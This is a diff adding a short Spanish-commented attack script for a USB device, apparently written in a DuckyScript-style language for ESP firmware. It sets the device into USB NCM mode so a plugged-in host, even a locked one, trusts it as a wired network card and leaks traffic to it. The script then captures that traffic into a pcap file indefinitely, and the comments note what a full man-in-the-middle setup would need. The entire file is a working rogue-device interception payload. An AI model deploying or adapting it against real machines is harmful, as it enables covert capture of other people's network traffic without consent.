@@ -1,0 +1,30 @@
+REM === Rogue USB-Ethernet capture (escenario B) ===
+REM El host ve una placa de red cableada nueva, la confia solo (incluso
+REM bloqueado) y empieza a filtrar trafico hacia 10.0.0.1 = esta placa.
+REM Lo capturamos en /usbncm_0.pcap. NO hay internet real: sin NAPT el
+REM trafico muere aca. Passthrough transparente = parche C en usb_ncm.c.
+REM ponytail: solo captura; para MITM con salida a internet hace falta
+REM          esp_netif_napt_enable() en firmware, no se puede desde .ds.
+
+DEFINE #SETTING_NAME usbDeviceType
+VAR $NCM = 2
+
+REM 1) Asegurar modo NCM (requiere reset la primera vez)
+IF (GET_SETTING_VALUE() != $NCM) THEN
+    DISPLAY_CLEAR
+    DISPLAY_TEXT 0 0 Cambiando a NCM...
+    SET_SETTING_UINT16 usbDeviceType $NCM
+    DELAY 2000
+    RESET
+END_IF
+
+REM 2) Ya en NCM: arrancar captura
+DISPLAY_CLEAR
+DISPLAY_TEXT 0 0 Capturando trafico
+DISPLAY_TEXT 0 10 /usbncm_0.pcap
+USB_NCM_PCAP_ON
+
+REM 3) Capturar indefinidamente hasta que desenchufen
+WHILE (1 == 1)
+    DELAY 10000
+END_WHILE
